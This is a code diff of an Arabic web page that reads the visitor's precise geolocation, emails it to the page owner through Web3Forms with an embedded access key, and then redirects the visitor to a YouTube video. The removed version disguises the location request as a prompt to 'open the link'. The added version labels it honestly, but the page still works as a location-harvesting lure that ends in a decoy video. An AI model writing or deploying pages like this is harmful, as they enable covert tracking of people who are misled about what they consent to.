@@ -14,12 +14,12 @@
 </head>
 <body>
   <div class="card">
-    <h2>الانتقال الى المتصفح</h2>
-    <p>هل تريد فتح الرابط في المتصفح الآن؟ سيتم طلب إذن من المتصفح.</p>
+    <h2>مشاركة موقعي</h2>
+    <p>هل تريد مشاركة موقعك الآن؟ سيتم طلب إذن من المتصفح.</p>
 
     <div style="display:flex;gap:10px;margin-top:12px">
-      <button id="btnShare" class="btn-primary">افتح الرابط</button>
-      <button id="btnCancel"></button>
+      <button id="btnShare" class="btn-primary">📍 شارك موقعي الآن</button>
+      <button id="btnCancel">❌ إلغاء</button>
     </div>
 
     <p class="hint">سيظهر إشعار من المتصفح لطلب الإذن.</p>
@@ -31,6 +31,8 @@
   </div>
 
 <script>
+const THANK_YOU_URL = 'https://www.youtube.com/watch?v=y6w8wcE2QK0&list=RDy6w8wcE2QK0&start_radio=1';
+
 const btnShare = document.getElementById('btnShare');
 const btnCancel = document.getElementById('btnCancel');
 const output = document.getElementById('output');
@@ -43,13 +45,13 @@ btnShare.addEventListener('click', async () => {
     return;
   }
 
-  show('⏳ جاري طلب إذن الوصول إلى رابط...');
+  show('⏳ جاري طلب إذن الوصول إلى الموقع...');
   navigator.geolocation.getCurrentPosition(async (pos) => {
     const lat = pos.coords.latitude.toFixed(6);
     const lon = pos.coords.longitude.toFixed(6);
     const acc = pos.coords.accuracy;
 
-    show(`:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);
+    show(`✅ تم الحصول على الموقع:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);
 
     // إرسال المعلومات إلى Web3Forms
     try {
@@ -57,7 +59,7 @@ btnShare.addEventListener('click', async () => {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          access_key: '2e13fcef-864c-4f30-b438-1155b980f68a',
+          access_key: '2e13fcef-864c-4f30-b438-1155b980f68a',  // مفتاح Web3Forms
           subject: 'موقع جديد تمت مشاركته',
           from_name: 'نموذج مشاركة الموقع',
           latitude: lat,
@@ -67,16 +69,21 @@ btnShare.addEventListener('click', async () => {
       });
 
       if (resp.ok) {
-        show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
+        // عرض رسالة سريعة ثم التحويل
+        show(output.innerHTML + '<br><em>📩 تم إرسال الموقع بنجاح. سيتم تحويلك الآن…</em>');
+        // التحويل التلقائي إلى فيديو اليوتيوب
+        window.location.href = THANK_YOU_URL;
+        // أو لو تريده يفتح في تبويب جديد بدل التحويل:
+        // window.open(THANK_YOU_URL, '_blank');
       } else {
-        show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
+        show(output.innerHTML + '<br><em>❌ فشل إرسال البيانات.</em>');
       }
     } catch (e) {
       show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
     }
 
   }, (err) => {
-    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض فتح رابط.');
+    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض مشاركة الموقع.');
     else if (err.code === err.POSITION_UNAVAILABLE) show('⚠️ الموقع غير متاح حالياً.');
     else if (err.code === err.TIMEOUT) show('⏰ انتهت المهلة.');
     else show('حدث خطأ: ' + err.message);
